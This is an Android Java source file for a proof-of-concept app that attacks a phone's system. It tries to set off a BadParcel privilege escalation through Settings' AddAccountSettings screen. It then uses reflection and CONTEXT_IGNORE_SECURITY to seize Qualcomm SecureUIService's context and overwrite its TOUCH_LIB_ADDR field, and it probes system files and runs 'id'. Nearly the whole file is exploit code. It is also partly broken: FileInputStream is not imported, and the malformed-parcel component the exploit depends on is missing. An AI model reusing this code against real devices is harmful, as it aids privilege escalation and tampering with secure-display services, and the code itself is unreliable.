package com.example.tzpoc;

import android.Manifest;
import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "SecureUIPoC";
    private static final String SECUREUI_PKG = "com.qualcomm.qti.services.secureui";
    private static final String SECUREUI_CLASS = SECUREUI_PKG + ".SecureUIService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    // SecureUI リフレクション用
    private Context systemContext;
    private Class<?> secureUIClass;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                // 別スレッドで実行
                testThread = new Thread(() -> executeFullTest());
                testThread.start();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("SecureUI + BadParcel PoC started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.MANAGE_ACCOUNTS,
                Manifest.permission.AUTHENTICATE_ACCOUNTS
        };
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, new String[]{p}, 100);
                break;
            }
        }
    }

    // ========== メインテスト ==========
    private void executeFullTest() {
        appendLog("========== PHASE 1: Trigger BadParcel Exploit ==========");
        triggerBadParcel();

        // BadParcel の結果を確認（/data/local/tmp/badparcel_success が存在するか）
        checkBadParcelResult();

        appendLog("========== PHASE 2: SecureUI Reflection Attempt ==========");
        attemptSecureUIReflection();

        appendLog("========== PHASE 3: System Context Verification ==========");
        if (systemContext != null) {
            testSystemContext();
        } else {
            appendLog("SystemContext not available.");
        }

        appendLog("========== PHASE 4: File System Exploration ==========");
        exploreFiles();

        appendLog("========== PHASE 5: id Command ==========");
        runIdCommand();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
    }

    // ---------- BadParcel Exploit 発動 ----------
    private void triggerBadParcel() {
        try {
            // AccountAuthenticator を起動するための Intent
            Intent attacker = new Intent();
            attacker.setComponent(new ComponentName("com.android.settings",
                    "com.android.settings.accounts.AddAccountSettings"));
            attacker.setAction(Intent.ACTION_RUN);
            attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            String[] authTypes = {getPackageName()};
            attacker.putExtra("account_types", authTypes);
            startActivity(attacker);
            appendLog("BadParcel exploit triggered (AddAccountSettings started).");
        } catch (Exception e) {
            appendLog("Failed to trigger BadParcel: " + e.getMessage());
        }
    }

    // ---------- BadParcel 結果確認 ----------
    private void checkBadParcelResult() {
        File successFile = new File("/data/local/tmp/badparcel_success");
        if (successFile.exists()) {
            appendLog("BadParcel seems successful! File exists: " + successFile.getAbsolutePath());
            // 内容を読み取る
            try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(successFile)))) {
                String line;
                while ((line = br.readLine()) != null) {
                    appendLog("badparcel_success content: " + line);
                }
            } catch (Exception e) {
                appendLog("Failed to read badparcel_success: " + e.getMessage());
            }
        } else {
            appendLog("BadParcel result file not found. Exploit may have failed.");
        }
    }

    // ---------- SecureUI リフレクション試行 ----------
    private void attemptSecureUIReflection() {
        appendLog("Attempting to load SecureUIService class...");
        // 通常のクラスローダ
        try {
            secureUIClass = Class.forName(SECUREUI_CLASS);
            appendLog("Class.forName succeeded.");
        } catch (ClassNotFoundException e) {
            appendLog("Class.forName failed: " + e.getMessage());
            // 代替手段: システムクラスローダ
            try {
                secureUIClass = Class.forName(SECUREUI_CLASS, true, ClassLoader.getSystemClassLoader());
                appendLog("SystemClassLoader succeeded.");
            } catch (Exception ex) {
                appendLog("SystemClassLoader failed: " + ex.getMessage());
                // さらに createPackageContext
                try {
                    Context remoteCtx = createPackageContext(SECUREUI_PKG,
                            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);
                    secureUIClass = remoteCtx.getClassLoader().loadClass(SECUREUI_CLASS);
                    appendLog("createPackageContext succeeded.");
                } catch (Exception ex2) {
                    appendLog("All class loading attempts failed. SecureUI not accessible.");
                    return;
                }
            }
        }

        if (secureUIClass != null) {
            appendLog("SecureUIService class loaded: " + secureUIClass.getName());
            // context フィールド取得
            try {
                Field contextField = secureUIClass.getDeclaredField("context");
                contextField.setAccessible(true);
                systemContext = (Context) contextField.get(null);
                if (systemContext != null) {
                    appendLog("SecureUIService.context acquired: " + systemContext);
                } else {
                    appendLog("SecureUIService.context is null (service not running?)");
                }
            } catch (Exception e) {
                appendLog("Failed to get context field: " + e.getMessage());
            }

            // 静的メソッドを呼び出してみる
            try {
                Method setRotation = secureUIClass.getMethod("setRotation", int.class);
                setRotation.invoke(null, 16);
                appendLog("setRotation(16) called successfully.");
            } catch (Exception e) {
                appendLog("setRotation failed: " + e.getMessage());
            }

            // TOUCH_LIB_ADDR を書き換えてみる
            try {
                Field touchField = secureUIClass.getDeclaredField("TOUCH_LIB_ADDR");
                touchField.setAccessible(true);
                byte[] original = (byte[]) touchField.get(null);
                appendLog("Original TOUCH_LIB_ADDR: " + bytesToHex(original));
                byte[] malicious = {0x00,0x00,0x00,0x00,0x00,0x00};
                touchField.set(null, malicious);
                appendLog("TOUCH_LIB_ADDR modified to zeros.");
                // 元に戻す
                touchField.set(null, original);
                appendLog("Restored TOUCH_LIB_ADDR.");
            } catch (Exception e) {
                appendLog("TOUCH_LIB_ADDR manipulation failed: " + e.getMessage());
            }
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }

    // ---------- SystemContext テスト ----------
    private void testSystemContext() {
        appendLog("Testing systemContext capabilities...");
        // ブロードキャスト送信
        try {
            Intent intent = new Intent("com.qualcomm.qti.services.secureui.ACTION_CLOSE");
            intent.setPackage(SECUREUI_PKG);
            systemContext.sendBroadcast(intent);
            appendLog("ACTION_CLOSE broadcast sent.");
        } catch (Exception e) {
            appendLog("Broadcast failed: " + e.getMessage());
        }
        // アクティビティ起動
        try {
            Intent settings = new Intent(Settings.ACTION_SETTINGS);
            settings.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            systemContext.startActivity(settings);
            appendLog("Settings started via systemContext.");
        } catch (Exception e) {
            appendLog("StartActivity failed: " + e.getMessage());
        }
        // ContentProvider クエリ
        try {
            android.content.ContentResolver cr = systemContext.getContentResolver();
            android.database.Cursor c = cr.query(android.provider.Settings.Global.CONTENT_URI,
                    null, null, null, null);
            if (c != null) {
                appendLog("Settings.Global query succeeded, count=" + c.getCount());
                c.close();
            }
        } catch (Exception e) {
            appendLog("ContentProvider query failed: " + e.getMessage());
        }
    }

    // ---------- ファイル探索 ----------
    private void exploreFiles() {
        appendLog("Exploring filesystem...");
        File root = new File("/");
        File[] files = root.listFiles();
        if (files != null) {
            appendLog("Root directory entries (first 20):");
            for (int i = 0; i < Math.min(20, files.length); i++) {
                appendLog("  " + files[i].getAbsolutePath());
            }
        }
        File tmp = new File("/data/local/tmp");
        if (tmp.exists() && tmp.canRead()) {
            appendLog("Contents of /data/local/tmp:");
            for (File f : tmp.listFiles()) {
                if (f != null) appendLog("  " + f.getName());
            }
        }
        // 書き込みテスト
        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists() || download.mkdirs()) {
            File test = new File(download, "poc_test.txt");
            try (FileOutputStream fos = new FileOutputStream(test)) {
                fos.write("Test write".getBytes());
                appendLog("Write to " + test.getAbsolutePath() + " succeeded.");
                test.delete();
            } catch (Exception e) {
                appendLog("Write to Download failed: " + e.getMessage());
            }
        }
    }

    // ---------- id コマンド ----------
    private void runIdCommand() {
        appendLog("Executing 'id' command...");
        try {
            Process process = Runtime.getRuntime().exec("id");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) out.append(line).append("\n");
            process.waitFor();
            appendLog("id output:\n" + out.toString());
        } catch (Exception e) {
            appendLog("id command failed: " + e.getMessage());
        }
    }

    // ==================== ログ・UI ====================
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            ((ScrollView) tvLog.getParent()).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) return;
            File file = new File(dir, "secureui_badparcel_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file)))) {
                pw.println("=== SecureUI + BadParcel PoC Log ===");
                pw.println("Timestamp: " + new Date());
                pw.println("=======================================");
                pw.print(logBuilder.toString());
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        saveLog();
    }
}
